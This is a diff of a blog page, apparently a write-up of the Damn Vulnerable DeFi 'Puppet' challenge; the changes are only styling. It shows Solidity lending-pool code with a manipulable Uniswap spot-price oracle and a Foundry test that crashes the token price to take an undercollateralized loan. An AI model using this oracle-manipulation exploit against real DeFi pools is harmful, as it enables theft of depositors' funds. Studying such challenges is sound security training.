@@ -97,7 +97,7 @@ Starting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from th
 
 
 
-<body class="preload-transitions colorscheme-dark">
+<body class="preload-transitions colorscheme-auto">
   
 <div class="float-container">
     <a id="dark-mode-toggle" class="colorscheme-toggle">
@@ -235,38 +235,38 @@ Uniswap V1 pool so we can read
 <a href="https://docs.uniswap.org/protocol/V1/introduction"  class="external-link" target="_blank" rel="noopener">the docs</a>
 to see how to interact with it.</p>
 <p>Let&rsquo;s review the <code>borrow</code> function:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">borrow</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">borrowAmount</span>) <span style="color:#728e00">public</span> <span style="color:#728e00">payable</span> <span style="color:#434f54">nonReentrant</span> {
-</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">depositRequired</span> <span style="color:#728e00">=</span> <span style="color:#434f54">calculateDepositRequired</span>(<span style="color:#434f54">borrowAmount</span>);
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> borrow(<span style="color:#fff;font-weight:bold">uint256</span> borrowAmount) <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">payable</span> nonReentrant {
+</span></span><span style="display:flex; background-color:#191919"><span>    <span style="color:#fff;font-weight:bold">uint256</span> depositRequired = calculateDepositRequired(borrowAmount);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span> <span style="color:#728e00">&lt;</span> <span style="color:#434f54">depositRequired</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">NotDepositingEnoughCollateral</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span> &lt; depositRequired) <span style="color:#fff;font-weight:bold">revert</span> NotDepositingEnoughCollateral();
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span> <span style="color:#728e00">&gt;</span> <span style="color:#434f54">depositRequired</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#728e00">payable</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>).<span style="color:#434f54">sendValue</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span> <span style="color:#728e00">-</span> <span style="color:#434f54">depositRequired</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span> &gt; depositRequired) {
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">payable</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>).sendValue(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span> - depositRequired);
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#434f54">deposits</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">=</span> <span style="color:#434f54">deposits</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">+</span> <span style="color:#434f54">depositRequired</span>;
+</span></span><span style="display:flex;"><span>    deposits[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>] = deposits[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>] + depositRequired;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// Fails if the pool doesn&#39;t have enough tokens in liquidity
-</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#728e00">if</span> (<span style="color:#728e00">!</span><span style="color:#434f54">token</span>.<span style="color:#728e00">transfer</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>, <span style="color:#434f54">borrowAmount</span>)) <span style="color:#728e00">revert</span> <span style="color:#434f54">TransferFailed</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// Fails if the pool doesn&#39;t have enough tokens in liquidity
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">if</span> (!token.<span style="color:#fff;font-weight:bold">transfer</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>, borrowAmount)) <span style="color:#fff;font-weight:bold">revert</span> TransferFailed();
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#434f54">emit</span> <span style="color:#434f54">Borrowed</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>, <span style="color:#434f54">depositRequired</span>, <span style="color:#434f54">borrowAmount</span>);
+</span></span><span style="display:flex;"><span>    emit Borrowed(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>, depositRequired, borrowAmount);
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>The first line in the function body is the most interesting one.
 It calls the <code>calculateDepositRequired</code> to get the amount of ETH
 we need to deposit as a collateral to borrow the given <code>amount</code> of DVT&rsquo;s.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">calculateDepositRequired</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">amount</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#728e00">public</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#728e00">view</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#728e00">returns</span> (<span style="color:#00979d">uint256</span>)
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> calculateDepositRequired(<span style="color:#fff;font-weight:bold">uint256</span> amount)
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">view</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">returns</span> (<span style="color:#fff;font-weight:bold">uint256</span>)
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#728e00">return</span> (<span style="color:#434f54">amount</span> <span style="color:#728e00">*</span> <span style="color:#434f54">_computeOraclePrice</span>() <span style="color:#728e00">*</span> <span style="color:#8a7b52">2</span>) <span style="color:#728e00">/</span> <span style="color:#8a7b52">10</span><span style="color:#728e00">**</span><span style="color:#8a7b52">18</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> (amount * _computeOraclePrice() * <span style="color:#ff0;font-weight:bold">2</span>) / <span style="color:#ff0;font-weight:bold">10</span>**<span style="color:#ff0;font-weight:bold">18</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>As we can see, user needs to deposit twice the borrow amount in
 ETH as collateral. This function calls the <code>_computeOraclePrice</code>
 to get the price of the token in <code>wei</code> according to Uniswap
 pair.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">_computeOraclePrice</span>() <span style="color:#728e00">private</span> <span style="color:#728e00">view</span> <span style="color:#728e00">returns</span> (<span style="color:#00979d">uint256</span>) {
-</span></span><span style="display:flex;"><span>    <span style="color:#728e00">return</span> (<span style="color:#434f54">uniswapPair</span>.<span style="color:#728e00">balance</span> <span style="color:#728e00">*</span> (<span style="color:#8a7b52">10</span><span style="color:#728e00">**</span><span style="color:#8a7b52">18</span>)) <span style="color:#728e00">/</span> <span style="color:#434f54">token</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#434f54">uniswapPair</span>);
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> _computeOraclePrice() <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">view</span> <span style="color:#fff;font-weight:bold">returns</span> (<span style="color:#fff;font-weight:bold">uint256</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> (uniswapPair.<span style="color:#fff;font-weight:bold">balance</span> * (<span style="color:#ff0;font-weight:bold">10</span>**<span style="color:#ff0;font-weight:bold">18</span>)) / token.balanceOf(uniswapPair);
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>The <code>_computeOraclePrice</code> acts as a price oracle. A terrible
 price oracle, because we can manipulate it by changing balances
@@ -287,22 +287,22 @@ appears to be sufficiently collateralized, but is in fact
 undercollateralized. Then we can call the <code>borrow</code> function,
 which will use the ETH/DVT as oracle and check it at the instant
 when the apparent price has been manipulated:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">testExploit</span>() <span style="color:#728e00">public</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">/** EXPLOIT START **/</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">startPrank</span>(<span style="color:#434f54">attacker</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#434f54">dvt</span>.<span style="color:#434f54">approve</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">uniswapExchange</span>), <span style="color:#434f54">ATTACKER_INITIAL_TOKEN_BALANCE</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// Sell all the DVT&#39;s we have to drop its price
-</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">result</span> <span style="color:#728e00">=</span> <span style="color:#434f54">uniswapExchange</span>.<span style="color:#434f54">tokenToEthSwapInput</span>(
-</span></span><span style="display:flex;"><span>        <span style="color:#434f54">ATTACKER_INITIAL_TOKEN_BALANCE</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#8a7b52">9</span> <span style="color:#728e00">*</span> <span style="color:#8a7b52">1</span><span style="color:#434f54">e18</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#434f54">DEADLINE</span>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> testExploit() <span style="color:#fff;font-weight:bold">public</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/** EXPLOIT START **/</span>
+</span></span><span style="display:flex;"><span>    vm.startPrank(attacker);
+</span></span><span style="display:flex;"><span>    dvt.approve(<span style="color:#fff;font-weight:bold">address</span>(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// Sell all the DVT&#39;s we have to drop its price
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">uint256</span> result = uniswapExchange.tokenToEthSwapInput(
+</span></span><span style="display:flex;"><span>        ATTACKER_INITIAL_TOKEN_BALANCE,
+</span></span><span style="display:flex;"><span>        <span style="color:#ff0;font-weight:bold">9</span> * <span style="color:#ff0;font-weight:bold">1</span>e18,
+</span></span><span style="display:flex;"><span>        DEADLINE
 </span></span><span style="display:flex;"><span>    );
-</span></span><span style="display:flex;"><span>    <span style="color:#434f54">assertGt</span>(<span style="color:#434f54">result</span>, <span style="color:#8a7b52">9</span> <span style="color:#00979d">ether</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// Get the undercollateralized loan
-</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#434f54">puppetPool</span>.<span style="color:#434f54">borrow</span>{<span style="color:#728e00">value</span><span style="color:#728e00">:</span> <span style="color:#8a7b52">20</span> <span style="color:#00979d">ether</span>}(<span style="color:#8a7b52">100</span><span style="color:#434f54">_000e18</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">stopPrank</span>();
-</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">/** EXPLOIT END **/</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#434f54">validation</span>();
+</span></span><span style="display:flex;"><span>    assertGt(result, <span style="color:#ff0;font-weight:bold">9</span> <span style="color:#fff;font-weight:bold">ether</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// Get the undercollateralized loan
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    puppetPool.borrow{<span style="color:#fff;font-weight:bold">value</span>: <span style="color:#ff0;font-weight:bold">20</span> <span style="color:#fff;font-weight:bold">ether</span>}(<span style="color:#ff0;font-weight:bold">100</span>_000e18);
+</span></span><span style="display:flex;"><span>    vm.stopPrank();
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/** EXPLOIT END **/</span>
+</span></span><span style="display:flex;"><span>    validation();
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><h2 id="summary-and-key-takeaways">
   Summary and key takeaways
